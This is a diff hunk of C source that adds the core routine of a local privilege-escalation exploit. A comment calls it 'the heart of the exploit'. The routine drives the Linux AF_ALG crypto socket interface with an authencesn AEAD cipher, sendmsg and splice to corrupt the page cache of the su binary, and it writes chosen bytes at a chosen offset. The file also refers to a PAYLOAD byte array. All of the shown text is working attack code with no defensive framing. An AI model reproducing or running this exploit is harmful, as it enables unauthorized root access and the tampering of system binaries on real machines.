@@ -37,3 +37,84 @@ static const unsigned char PAYLOAD[] = {
 void create_helper() {
     // Not strictly needed in final version, but kept for compatibility
 }
+
+// The heart of the exploit: uses AF_ALG + splice to corrupt su's page cache
+int patch(int fd, off_t off, const unsigned char b[4]) {
+    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (s < 0) return -1;
+
+    struct sockaddr_alg sa = {};
+    sa.salg_family = AF_ALG;
+    memcpy(sa.salg_type, "aead", 5);
+    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 32);
+
+    if (bind(s, (struct sockaddr*)&sa, sizeof sa) < 0) {
+        close(s);
+        return -1;
+    }
+
+    static const unsigned char k[40] = {0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0};
+    setsockopt(s, SOL_ALG, ALG_SET_KEY, k, sizeof k);
+
+    int as = 4;
+    setsockopt(s, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &as, 4);
+
+    int o = accept(s, nullptr, nullptr);
+    if (o < 0) {
+        close(s);
+        return -1;
+    }
+
+    unsigned char aad[8] = {'A','A','A','A', b[0],b[1],b[2],b[3]};
+    struct iovec iov = { .iov_base = aad, .iov_len = 8 };
+
+    union {
+        struct cmsghdr align;
+        unsigned char buf[128];
+    } cbuf = {};
+
+    struct msghdr msg = {
+        .msg_iov = &iov,
+        .msg_iovlen = 1,
+        .msg_control = cbuf.buf,
+        .msg_controllen = sizeof cbuf.buf
+    };
+
+    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
+    cm->cmsg_level = SOL_ALG;
+    cm->cmsg_type  = ALG_SET_OP;
+    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
+    *(uint32_t*)CMSG_DATA(cm) = 0;  // ALG_OP_DECRYPT
+
+    cm = CMSG_NXTHDR(&msg, cm);
+    cm->cmsg_level = SOL_ALG;
+    cm->cmsg_type  = ALG_SET_IV;
+    cm->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
+    struct af_alg_iv *iv = (struct af_alg_iv*)CMSG_DATA(cm);
+    iv->ivlen = 16;
+    memset(iv->iv, 0, 16);
+
+    cm = CMSG_NXTHDR(&msg, cm);
+    cm->cmsg_level = SOL_ALG;
+    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
+    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
+    *(uint32_t*)CMSG_DATA(cm) = 8;
+
+    sendmsg(o, &msg, MSG_MORE);
+
+    int pipefd[2];
+    pipe(pipefd);
+
+    off_t src = off;
+    splice(fd, &src, pipefd[1], nullptr, off + 4, 0);
+    splice(pipefd[0], nullptr, o, nullptr, off + 4, 0);
+
+    char sink[512];
+    recv(o, sink, sizeof sink, 0);
+
+    close(pipefd[0]);
+    close(pipefd[1]);
+    close(o);
+    close(s);
+    return 0;
+}
